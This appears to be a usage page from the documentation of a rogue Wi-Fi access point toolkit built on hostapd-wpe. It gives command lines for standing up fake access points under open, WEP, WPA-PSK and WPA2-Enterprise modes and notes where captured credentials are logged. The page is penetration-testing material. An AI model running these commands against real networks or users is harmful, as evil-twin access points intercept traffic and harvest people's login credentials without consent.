---
layout: default
title: Setting Authentication Mode
parent: Usage
nav_order: 2
permalink: /usage/authentication
---

# Setting Authentication Mode

The Rogue Toolkit allows users to set any of the 802.11 authentication methods supported by the hostapd-wpe software. Below is examples of the minimum requirements for selecting a authentication method. However, some additional arguments may also be supported by the toolkit for each method to allow for fine-tuning.

## OPEN
```
sudo python3 /opt/rogue/rogue.py -i wlan0 --auth open --internet --preset-profile wifi4 --channel-randomiser
```

## WEP
```
sudo python3 /opt/rogue/rogue.py -i wlan0 --auth wep --wep-key-version 0 --wep-key 4141414141 --internet --preset-profile wifi4 --channel-randomiser
```

## WPA1-PSK
```
sudo python3 /opt/rogue/rogue.py -i wlan0 --auth wpa-personal --wpa 1 --wpa-passphrase "test test" --internet --preset-profile wifi4 --channel-randomiser
```

## WPA2-PSK
```
sudo python3 /opt/rogue/rogue.py -i wlan0 --auth wpa-personal --wpa 2 --wpa-passphrase "test test" --internet --preset-profile wifi4 --channel-randomiser
```

## WPA2-Enterprise
```
sudo python3 /opt/rogue/rogue.py --cert-wizard
sudo python3 /opt/rogue/rogue.py -i wlan0 --auth wpa-enterprise --internet --preset-profile wifi4 --channel-randomiser --default-eap peap -E all
```

*Note: Captured credentials will be stored in `rogue/logs/freeradius-server-wpe.log`*
